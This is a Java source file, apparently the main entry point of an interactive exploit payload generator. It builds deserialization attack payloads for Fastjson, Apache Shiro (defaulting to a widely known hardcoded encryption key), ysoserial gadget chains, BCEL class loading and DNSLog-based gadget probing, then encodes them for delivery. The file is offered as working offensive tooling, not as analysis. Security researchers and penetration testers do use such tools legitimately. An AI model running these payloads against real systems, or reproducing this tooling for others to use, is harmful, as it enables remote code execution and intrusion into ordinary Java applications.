package com.ding0x0.run;

import com.ding0x0.Generate;
import com.ding0x0.Payload;
import com.ding0x0.bootstrap.TypeErrorException;
import com.ding0x0.fastjson.GenerateFastjsonPayload;
import com.ding0x0.gadget.GenerateDNSLogPayload;
import com.ding0x0.other.GenerateBCELPayload;
import com.ding0x0.other.GenerateShiroPayload;
import com.ding0x0.utils.Code;
import com.ding0x0.utils.Util;
import com.ding0x0.yso.GenerateYsoPayload;
import com.ding0x0.yso.Serializer;
import com.ding0x0.utils.Enums.*;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.*;
import java.util.Base64.Encoder;

import static org.fusesource.jansi.Ansi.ansi;

public class App {
    public static HashMap<String, String> parserArgs(String args){
        // 获取到参数数组
        HashMap<String, String> map = new HashMap<>();
        if (args.trim().equals("")){
            return map;
        }
        String[] tmp = args.split(" ");
        for (int i = 0; i< tmp.length; i = i+2){
            map.put(tmp[i],tmp[i+1]);
        }
        return map;
    }

    public static ArrayList<String> parserArgs(String args, String type) {
        // 获取到参数数组
        String[] tmp = args.split(" ");
        // 用户输入参数
        ArrayList<String> inputArgs = new ArrayList<String>(Arrays.asList(tmp));
        // 输出参数列表
        ArrayList<String> outputArgs = new ArrayList<>();
        // enum参数列表
        ArrayList<String> typeArgs = null;

        // 遍历enum获取对应的参数列表
        for (FastjsonType types :
                FastjsonType.values()){
            if (types.name().equals(type)){
                typeArgs = FastjsonType.get(type);
                break;
            }
        }

        // 检测类型是否正常
        if (typeArgs == null){
            throw new TypeErrorException("fastjson type error");
        }

        // 循环设置参数
        for (String arg :
                typeArgs ) {
            int index = inputArgs.indexOf(arg);
            // 如果找不到用户输入
            if (index == -1){
                if (type.equals("jdbc") && arg.equals("-un")){
                    outputArgs.add("yso_URLDNS_http://xxx.dnslog.cn");
                    continue;
                }else if (type.equals("jdbc") && arg.equals("-statement")){
                    outputArgs.add("com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor");
                    continue;
                }else {
                    System.out.println("params error, plz check input");
                    System.exit(1);
                }
            }
            outputArgs.add(inputArgs.get(index + 1));
        }
        return outputArgs;
    }

    public  static void printGadget() throws NoSuchFieldException, IllegalAccessException {
        List<String> gadgets = Util.getGadgetList();
        System.out.println("-------------------");
        for (String gadget :
                gadgets) {
            System.out.println(gadget);
        }
        System.out.println("-------------------");
    }

    public void run() throws Exception {
        Scanner scanner = new Scanner(System.in);
        // 输入参数
        String type = null;
        // 判断是否输入过，用来跳过-h后重复输入
        boolean typeFlag = false;
        String mType = null;
        String args = null;
        boolean mTypeFlag = false;
        boolean argsFlag = false;

        while (true){
            if (!typeFlag){
                System.out.println("[+] input payload type, use -h Get help");
                type = scanner.nextLine();
                typeFlag = true;
            }
            if (type.contains("-h")){
                System.out.println(Type.getAll());
                typeFlag = false;
                continue;
            }

            // 生成 raw payload
            Payload object = null;
            Object rawObj = null;
            Generate generate;

            File file = null;

            switch (type){
                case "fastjson":
                    if (!mTypeFlag){
                        System.out.println("[+] input fastjson payload type, use -h get help");
                        mType = scanner.nextLine();
                        mTypeFlag = true;
                    }
                    if (mType != null && mType.contains("-h")){
                        System.out.println(FastjsonType.getAll());
                        mType = null;
                        mTypeFlag = false;
                        continue;
                    }

                    if (!argsFlag){
                        System.out.println("[+] input payload params, use -h get help, use -hh get example");
                        args = scanner.nextLine();
                        argsFlag = true;
                    }

                    if (args != null && args.contains("-hh")){
                        System.out.println(Args.getFastjsonHelper());
                        args = null;
                        argsFlag = false;
                        continue;
                    }
                    if (args !=null && args.contains("-h")){
                        System.out.println(Args.getAll());
                        args = null;
                        argsFlag = false;
                        continue;
                    }
                    if (args.length() <2){
                        System.out.println("params error, plz check input");
                        System.exit(1);
                    }else {
                        ArrayList<String> funcArgs = parserArgs(args, mType);
                        generate = new GenerateFastjsonPayload(funcArgs, mType);
                        object = (Payload) generate.generatePayload();
                    }
                    break;
                case "find":
                    System.out.println("[+] dnslog to find gadget\n" +
                            "-u  dnslog\n" +
                            "-f  payload write to file");
                    args = scanner.nextLine();
                    HashMap<String, String> funcArgs2 = parserArgs(args.trim());
                    if (args.equals("")){
                        System.out.printf("plz input -d dnslog");
                        System.exit(0);
                    }
                    String dnslog = funcArgs2.get("-u");
                    String path = funcArgs2.getOrDefault("-f","null");
                    if (!path.equals("null")){
                        file = new File(path);
                    }
                    generate = new GenerateDNSLogPayload(dnslog);
                    object = (Payload) generate.generatePayload();
                    break;
                case "shiro":
                    System.out.println("[+] shiro payload\n" +
                            "-g* shiro gadget\n" +
                            "-c command\n" +
                            "-d dirty data\n" +
                            "-k key, default kPH+bIxk5D2deZiIxcaaaA==\n" +
                            "-gh show gadget\n");
                    args = scanner.nextLine();
                    if (args.contains("-gh")){
                        printGadget();
                        continue;
                    }
                    HashMap<String, String> funcArgs = parserArgs(args);
                    String gadgetArg = funcArgs.getOrDefault("-g", null);
                    String key = funcArgs.getOrDefault("-k", "kPH+bIxk5D2deZiIxcaaaA==");
                    String dirtyArg = funcArgs.getOrDefault("-d", null);
                    String cmd = funcArgs.getOrDefault("-c", "sb");
                    generate = new GenerateShiroPayload(gadgetArg, key, cmd, dirtyArg);
                    object = (Payload) generate.generatePayload();
                    break;
                case "yso":
                    if (!mTypeFlag){
                        System.out.println("[+] input yso gadget, use -h get help");
                        mType = scanner.nextLine();
                        mTypeFlag = true;
                    }
                    if (mType != null && mType.contains("-h")){
                        printGadget();
                        args = null;
                        mTypeFlag = false;
                        continue;
                    }
                    if (!argsFlag){
                        System.out.println("[+] input yso params, use -h get help");
                        args = scanner.nextLine();
                        argsFlag = true;
                    }

                    if (args.contains("-h")){
                        System.out.println(Args.getYsoHelper());
                        args = null;
                        argsFlag = false;
                        continue;
                    }

                    HashMap<String, String> funcArgs1 = parserArgs(args);
                    String command = funcArgs1.getOrDefault("-c", "sb");
                    String dirty = funcArgs1.getOrDefault("-d", null);
                    generate = new GenerateYsoPayload(mType, command, dirty);
                    object = (Payload) generate.generatePayload();
                    break;
                case "bcel":
                    System.out.println("[+] generate bcel payload\n" +
                            "-lf local class file");
                    args = scanner.nextLine();
                    HashMap<String, String> funcArgs3 = parserArgs(args);
                    String lf = funcArgs3.getOrDefault("-lf", null);
                    if (lf == null){
                        System.out.println("plz input local file path");
                        System.exit(1);
                    }
                    generate = new GenerateBCELPayload(lf);
                    object = (Payload) generate.generatePayload();
                    break;
                case "log4j":
                    break;
                default:
                    throw new TypeErrorException("payload error");
            }

            // 编码
            System.out.println("[+] input payload encode, default raw, use -h get help");
            boolean helpFlag = false;
            String input;
            input = scanner.nextLine();
            if (!helpFlag && input.contains("-h")){
                System.out.println(Encode.getAll());
                helpFlag = true;
            }
            if (helpFlag){
                input = scanner.nextLine();
            }

            String[] encodeList = input.split(" ");
            rawObj = object.format();
            if (input.trim().equals("") || input.trim().contains("-raw") || input.trim().contains("raw")){
                if (!type.equals("yso") && !type.equals("find")){
                    System.out.println("[*] success");
                    System.out.println(rawObj);
                }else {
                    if (file!=null){
                        FileOutputStream fileOutputStream = new FileOutputStream(file);
                        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
                        objectOutputStream.writeObject(rawObj);
                        objectOutputStream.flush();
                        System.out.printf("[*] success");
                        System.out.printf("   ->  " + file.getAbsolutePath());
                    }else {
                        rawObj = Serializer.serialize(rawObj);
                        Serializer.serialize(rawObj, System.out);
                    }
                }
                break;
            }
            Object result = object.format();
            for (String encode :
                    encodeList) {
                switch (encode){
                    case "-ue":
                        result = Code.urlEncode((String) result);
                        break;
                    case "-xe":
                        result = Code.O2XML(result);
                        break;
                    case "-be":
                        result = Code.base64Encode(result);
                        break;
                    case "-he":
                        result = Code.HTMLEncode((String) result);
                }
            }
            System.out.println(result);
            break;
        }
    }

    public static void main(String[] args) throws Exception {
        App app = new App();
        app.run();
    }
}
